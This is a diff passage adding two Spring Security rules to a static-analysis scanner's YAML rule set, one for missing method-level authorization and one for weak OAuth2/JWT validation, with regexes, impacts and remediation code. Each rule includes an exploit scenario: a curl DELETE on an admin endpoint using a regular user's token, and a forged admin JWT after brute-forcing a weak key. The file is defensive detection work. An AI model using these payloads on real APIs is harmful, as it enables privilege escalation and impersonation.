+        pattern: '@PostMapping\s*\([^)]*admin[^)]*\)\s*\n\s*public\s+\w+\s+\w+\s*\('
+        description: "Admin POST endpoint without method security"
+      - type: regex
+        pattern: '@GetMapping\s*\([^)]*\/users[^)]*\)\s*\n\s*public\s+\w+\s+(getAll|listAll|findAll)'
+        description: "User listing endpoint without access control"
+      - type: regex
+        pattern: 'public\s+\w+\s+delete\w+\s*\(\s*@PathVariable'
+        description: "Delete method with path variable no security check"
+      - type: regex
+        pattern: '@RestController[\s\S]*?@RequestMapping\s*\(\s*"\/admin'
+        description: "Admin controller without class-level security"
+    anti_patterns:
+      - '@PreAuthorize\s*\('
+      - '@Secured\s*\('
+      - '@RolesAllowed\s*\('
+      - '@PostAuthorize\s*\('
+      - '@EnableMethodSecurity'
+      - '@EnableGlobalMethodSecurity'
+      - 'hasRole\s*\('
+      - 'hasAuthority\s*\('
+      - 'isAuthenticated\s*\('
+      - 'SecurityContextHolder\.getContext'
+      - 'authentication\.getAuthorities'
+      - 'accessDecisionManager'
+      - '@WithMockUser'
+      - 'MethodSecurityExpressionHandler'
+      - 'principal\.\w+'
+    bypass_variants:
+      - description: "Security annotation present but with always-true expression"
+        pattern: '@PreAuthorize\s*\(\s*"true"\s*\)'
+      - description: "Class-level security but method-level override with permitAll"
+        pattern: '@PreAuthorize\s*\(\s*"permitAll"\s*\)[\s\S]*?@(Delete|Put)Mapping'
+      - description: "Security check in code but exception caught and ignored"
+        pattern: 'try\s*\{[\s\S]*?checkPermission[\s\S]*?\}\s*catch\s*\([^)]*\)\s*\{[\s\S]*?\}'
+    evasion_indicators:
+      - "Authorization logic implemented in aspect but not applied to all controllers"
+      - "Role check in frontend only without backend enforcement"
+      - "Security interceptor registered but with permissive configuration"
+    encoding_variants:
+      - type: "custom_annotation"
+        pattern: '@\w+Authorized[\s\S]*?@(Get|Post|Put|Delete)Mapping'
+      - type: "aop_security"
+        pattern: '@Around\s*\(\s*"execution[^"]*Controller\.\*\('
+    multi_function_chain_patterns:
+      - "@DeleteMapping('/users/{id}') -> service.deleteUser(id) -> repository.delete() [no auth check]"
+      - "@PutMapping('/config') -> service.updateConfig(dto) -> config saved [no admin check]"
+      - "@PostMapping('/admin/users') -> service.createAdmin(user) -> admin created [no role check]"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Missing method security enables privilege escalation from regular user to admin"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Authenticated request with regular user privileges"
+        sink: "Administrative or privileged controller method"
+        through: "Missing method-level security annotation"
+    impact: |
+      Without method-level security, authorization depends entirely on
+      URL-pattern matching in HttpSecurity configuration. If URL patterns
+      change, new endpoints are added, or patterns overlap, privileged
+      operations may become accessible to unauthorized users. Method-level
+      security provides defense-in-depth ensuring that each operation
+      independently verifies the caller's authorization.
+    remediation: |
+      Enable and apply method-level security:
+
+      ```java
+      @Configuration
+      @EnableMethodSecurity(prePostEnabled = true)
+      public class MethodSecurityConfig { }
+
+      @RestController
+      @RequestMapping("/api/admin")
+      @PreAuthorize("hasRole('ADMIN')")
+      public class AdminController {
+
+          @DeleteMapping("/users/{id}")
+          @PreAuthorize("hasAuthority('USER_DELETE')")
+          public ResponseEntity<?> deleteUser(@PathVariable Long id) {
+              // Method is protected by both class and method-level security
+              userService.deleteUser(id);
+              return ResponseEntity.ok().build();
+          }
+
+          @PutMapping("/config")
+          @PreAuthorize("hasRole('SUPER_ADMIN')")
+          public ResponseEntity<?> updateConfig(@RequestBody ConfigDto config) {
+              configService.update(config);
+              return ResponseEntity.ok().build();
+          }
+      }
+      ```
+    references:
+      - "https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html"
+      - "https://cwe.mitre.org/data/definitions/862.html"
+      - "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@RestController'
+        - '@Controller'
+        - '@RequestMapping'
+        - '@Service'
+      taint_source_indicators:
+        - '@RequestParam'
+        - '@PathVariable'
+        - '@RequestBody'
+      taint_sink_indicators:
+        - 'repository\.\w+\s*\('
+        - 'service\.\w+\s*\('
+        - '\.delete\s*\('
+        - '\.save\s*\('
+      sanitization_patterns:
+        - '@PreAuthorize'
+        - '@Secured'
+        - '@RolesAllowed'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (state_changing_method ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        A Spring REST API has URL-level security requiring authentication
+        for /api/** but no method-level security. An authenticated regular
+        user discovers an admin endpoint at /api/admin/users/1 (DELETE).
+        Since the URL pattern /api/** only checks authentication (not
+        authorization), the regular user successfully deletes the admin
+        user by sending a DELETE request, escalating their privileges.
+      example_payload: "curl -X DELETE https://target.com/api/admin/users/1 -H 'Authorization: Bearer regular_user_token'"
+      attacker_objective: "Access admin operations as a regular user by exploiting missing method-level authorization"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-001"
+        - "FW-SPRING-004"
+        - "FW-SPRING-006"
+
+  - rule_id: "FW-SPRING-006"
+    title: "Insecure OAuth2 Resource Server Configuration in Spring"
+    description: >
+      Detects Spring Security OAuth2 resource server configurations that
+      are insecure, including disabled token validation, permissive JWT
+      verification, missing audience validation, or use of symmetric keys
+      that can be brute-forced. Improper OAuth2 configuration can allow
+      attackers to forge access tokens and gain unauthorized access to
+      protected resources.
+    language: java
+    category: framework_misuse
+    severity: High
+    confidence: 0.87
+    cwe: CWE-287
+    owasp: "A07:2021-Identification and Authentication Failures"
+    tags:
+      - spring
+      - oauth2
+      - jwt
+      - token-validation
+      - authentication
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'NimbusJwtDecoder\.withSecretKey\s*\('
+        description: "JWT decoder using symmetric secret key (easily brute-forced)"
+      - type: regex
+        pattern: 'setSigningKey\s*\(\s*"[^"]{1,32}"\s*\)'
+        description: "Short signing key for JWT validation"
+      - type: regex
+        pattern: 'oauth2ResourceServer\s*\(\s*\)\s*\.jwt\s*\(\s*\)(?![\s\S]*?jwtDecoder)'
+        description: "OAuth2 resource server without custom JWT decoder config"
+      - type: regex
+        pattern: 'JwtDecoder[\s\S]*?withoutClaimValidation'
+        description: "JWT decoder with claim validation disabled"
+      - type: regex
+        pattern: 'jwt\s*\(\s*\)\s*\.jwkSetUri\s*\(\s*"http://'
+        description: "JWK set URI using insecure HTTP"
+      - type: regex
+        pattern: '@Bean[\s\S]*?JwtDecoder[\s\S]*?algorithms\s*\(\s*"none"\s*\)'
+        description: "JWT decoder accepting 'none' algorithm"
+    anti_patterns:
+      - 'NimbusJwtDecoder\.withJwkSetUri\s*\(\s*"https://'
+      - 'jwtAuthenticationConverter'
+      - 'withClaimValidation'
+      - 'audienceValidator'
+      - 'JwtTimestampValidator'
+      - 'issuerUri\s*\(\s*"https://'
+      - 'setJwkSetUri\s*\(\s*"https://'
+      - 'JwtIssuerValidator'
+      - 'withIssuerLocation\s*\(\s*"https://'
+      - 'RS256'
+      - 'ES256'
+      - 'setVerificationKey'
+      - 'oauth2\.resourceserver\.jwt\.issuer-uri\s*=\s*https://'
+      - 'DelegatingOAuth2TokenValidator'
+      - 'JwtClaimValidator'
+    bypass_variants:
+      - description: "JWT validation present but audience check missing"
+        pattern: 'NimbusJwtDecoder\.withJwkSetUri[\s\S]*?(?!.*audienceValidator)'
+      - description: "Token validation bypassed for specific paths"
+        pattern: '\.antMatchers\s*\(\s*"\/api\/(public|open)[^"]*"\s*\)\s*\.permitAll[\s\S]*?oauth2ResourceServer'
+      - description: "Custom JWT decoder that ignores expiration"
+        pattern: 'JwtDecoder[\s\S]*?setClockSkew\s*\(\s*Duration\.ofDays'
+    evasion_indicators:
+      - "JWT verification key loaded from environment variable with weak default"
+      - "Token validation middleware registered but order allows bypass"
+      - "OAuth2 configuration in separate profile not loaded in production"
+    encoding_variants:
+      - type: "base64_key"
+        pattern: 'setSigningKey\s*\(\s*Base64\.getDecoder\s*\(\s*\)\.decode\s*\(\s*"[A-Za-z0-9+/=]{1,44}"\s*\)'
+      - type: "property_key"
+        pattern: 'jwt\.secret\s*=\s*[a-zA-Z0-9]{1,32}$'
+    multi_function_chain_patterns:
+      - "oauth2ResourceServer -> jwt() -> weak secret key -> token forging"
+      - "JwtDecoder bean -> no audience validation -> cross-tenant token reuse"
+      - "resource server -> http:// JWK URI -> MITM key injection -> token bypass"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Forged JWT tokens enable impersonation of any user including admin"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Forged or manipulated JWT access token"
+        sink: "Spring Security authentication context"
+        through: "Insecure JwtDecoder configuration"
+    impact: |
+      Insecure OAuth2 resource server configuration allows attackers to forge
+      or manipulate JWT tokens. With a weak symmetric key, tokens can be
+      brute-forced offline. Without audience validation, tokens issued for
+      one service can be reused on another. Without proper issuer validation,
+      tokens from any authorization server are accepted. This results in
+      unauthorized access to all protected resources.
+    remediation: |
+      Configure OAuth2 resource server with proper JWT validation:
+
+      ```java
+      @Bean
+      public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+          http.oauth2ResourceServer(oauth2 -> oauth2
+              .jwt(jwt -> jwt
+                  .decoder(jwtDecoder())
+                  .jwtAuthenticationConverter(jwtAuthenticationConverter())
+              )
+          );
+          return http.build();
+      }
+
+      @Bean
+      public JwtDecoder jwtDecoder() {
+          NimbusJwtDecoder decoder = NimbusJwtDecoder
+              .withJwkSetUri("https://auth.example.com/.well-known/jwks.json")
+              .build();
+
+          OAuth2TokenValidator<Jwt> validators = new DelegatingOAuth2TokenValidator<>(
+              new JwtTimestampValidator(),
+              new JwtIssuerValidator("https://auth.example.com"),
+              new JwtClaimValidator<List<String>>("aud",
+                  aud -> aud.contains("my-api"))
+          );
+          decoder.setJwtValidator(validators);
+          return decoder;
+      }
+      ```
+    references:
+      - "https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html"
+      - "https://cwe.mitre.org/data/definitions/287.html"
+      - "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+      - "https://datatracker.ietf.org/doc/html/rfc7519"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'oauth2ResourceServer'
+        - 'JwtDecoder'
+        - 'NimbusJwtDecoder'
+        - 'spring\.security\.oauth2'
+      taint_source_indicators:
+        - 'Authorization\s*header'
+        - 'Bearer\s+token'
+        - '@AuthenticationPrincipal'
+      taint_sink_indicators:
+        - 'JwtDecoder'
+        - 'setSigningKey'
+        - 'withSecretKey'
+      sanitization_patterns:
+        - 'DelegatingOAuth2TokenValidator'
+        - 'JwtTimestampValidator'
+        - 'JwtIssuerValidator'
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (symmetric_key ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot API uses a weak symmetric key 'mysecret123' for JWT
+        validation. An attacker obtains a valid token and uses jwt-cracker
+        to brute-force the signing key. With the key known, the attacker
+        forges a JWT with {"sub": "admin", "roles": ["ADMIN"]} and signs
+        it with the discovered secret. The API accepts the forged token,
+        granting the attacker full admin access.
+      example_payload: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbIkFETUlOIl0sImV4cCI6OTk5OTk5OTk5OX0.forged_signature"
+      attacker_objective: "Forge JWT tokens to impersonate any user and access protected resources"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-001"
+        - "FW-SPRING-005"
